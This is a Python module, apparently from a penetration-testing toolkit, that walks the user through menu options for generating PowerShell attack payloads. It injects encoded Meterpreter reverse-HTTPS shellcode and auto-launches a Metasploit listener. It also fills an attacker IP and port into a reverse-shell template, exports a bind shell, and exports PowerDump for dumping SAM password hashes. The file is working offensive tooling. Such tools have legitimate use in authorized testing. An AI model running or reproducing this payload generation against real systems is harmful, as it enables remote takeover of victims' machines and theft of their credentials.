#!/usr/bin/python
# coding=utf-8
#
#
# handle powershell payloads and get them ready
#
#
#
import os
import shutil
import subprocess

import src
import src.core.setcore as core
from src.core.menu import text

# Py2/3 compatibility
# Python3 renamed raw_input to input
try:
    input = raw_input
except NameError:
    pass

core.debug_msg(core.mod_name(), "printing 'text.powershell menu'", 5)

show_powershell_menu = core.create_menu(text.powershell_text, text.powershell_menu)
powershell_menu_choice = input(core.setprompt(["29"], ""))

if powershell_menu_choice != "99":
    # specify ipaddress of reverse listener
    #ipaddr = core.grab_ipaddress()
    ipaddr = input("Enter the IPAddress or DNS name for the reverse host: ")
    core.update_options("IPADDR=" + ipaddr)

    # if we select alphanumeric shellcode
    if powershell_menu_choice == "1":
        port = input(core.setprompt(["29"], "Enter the port for the reverse [443]"))
        if not port:
            port = "443"
        core.update_options("PORT=" + port)
        core.update_options("POWERSHELL_SOLO=ON")
        core.print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")

        with open(core.userconfigpath + "payload_options.shellcode", "w") as filewrite:
            filewrite.write("windows/meterpreter/reverse_https {},".format(port))

        try:
            core.module_reload(src.payloads.powershell.prep)
        except:
            import src.payloads.powershell.prep

        #prep_powershell_payload()

        # create the directory if it does not exist
        if not os.path.isdir(core.userconfigpath + "reports/powershell"):
            os.makedirs(core.userconfigpath + "reports/powershell")

        # here we format everything for us
        with  open(core.userconfigpath + "x86.powershell") as fileopen:
            x86 = fileopen.read()
        x86 = core.powershell_encodedcommand(x86)
        core.print_status("If you want the powershell commands and attack, they are exported to {0}".format(os.path.join(core.userconfigpath, "reports/powershell/")))
        with open(core.userconfigpath + "reports/powershell/x86_powershell_injection.txt", "w") as filewrite:
            filewrite.write(x86)

        choice = core.yesno_prompt("0", "Do you want to start the listener now [yes/no]: ")
        if choice == 'NO':
            pass

        # if we want to start the listener
        if choice == 'YES':
            with open(core.userconfigpath + "reports/powershell/powershell.rc", "w") as filewrite:
                filewrite.write("use multi/handler\n"
                                "set payload windows/meterpreter/reverse_https\n"
                                "set LPORT {0}\n"
                                "set LHOST 0.0.0.0\n"
                                "set ExitOnSession false\n"
                                "exploit -j".format(port))

            msf_path = core.meta_path()
            subprocess.Popen("{0} -r {1}".format(os.path.join(msf_path, "msfconsole"),
                                                 os.path.join(core.userconfigpath, "reports/powershell/powershell.rc")),
                             shell=True).wait()

        core.print_status("Powershell files can be found under {0}".format(os.path.join(core.userconfigpath, "reports/powershell")))
        core.return_continue()

    # if we select powershell reverse shell
    if powershell_menu_choice == "2":

        # prompt for IP address and port
        port = input(core.setprompt(["29"], "Enter the port for listener [443]"))
        # default to 443
        if not port:
            port = "443"
        # open the reverse shell up
        core.print_status("Rewriting the powershell reverse shell with options")
        with open("src/powershell/reverse.powershell") as fileopen:
            data = fileopen.read()
        data = data.replace("IPADDRHERE", ipaddr)
        data = data.replace("PORTHERE", port)
        core.print_status("Exporting the powershell stuff to {0}".format(os.path.join(core.userconfigpath, "reports/powershell")))
        # create the directory if it does not exist
        if not os.path.isdir(core.userconfigpath + "reports/powershell"):
            os.makedirs(core.userconfigpath + "reports/powershell")
        with open(core.userconfigpath + "reports/powershell/powershell.reverse.txt", "w") as filewrite:
            filewrite.write(data)

        choice = core.yesno_prompt("0", "Do you want to start a listener [yes/no]")
        if choice == "NO":
            core.print_status("Have netcat or standard socket listener on port {0}".format(port))
        if choice == "YES":
            core.socket_listener(port)

        core.return_continue()

    # if we select powershell bind shell
    if powershell_menu_choice == "3":

        port = input(core.setprompt(["29"], "Enter the port for listener [443]"))

        # open file
        with open("src/powershell/bind.powershell") as fileopen:
            data = fileopen.read()
        data = data.replace("PORTHERE", port)
        # create the directory if it does not exist
        if not os.path.isdir(core.userconfigpath + "reports/powershell"):
            os.makedirs(core.userconfigpath + "reports/powershell")
        with open(core.userconfigpath + "reports/powershell/powershell.bind.txt", "w") as filewrite:
            filewrite.write(data)
        core.print_status("The powershell program has been exported to {0}".format(os.path.join(core.userconfigpath, "reports/powershell/")))
        core.return_continue()

    # if we select powershell powerdump SAM dump
    if powershell_menu_choice == "4":

        # create the directory if it does not exist
        if not os.path.isdir(core.userconfigpath + "reports/powershell"):
            os.makedirs(core.userconfigpath + "reports/powershell")
        # copy file
        if os.path.isfile("src/powershell/powerdump.encoded"):
            shutil.copyfile("src/powershell/powerdump.encoded", core.userconfigpath + "reports/powershell/powerdump.encoded.txt")
        core.print_status("The powershell program has been exported to {}".format(os.path.join(core.userconfigpath, "reports/powershell")))
        core.print_status("Note with PowerDump -- You MUST be running as SYSTEM when executing.")
        core.return_continue()
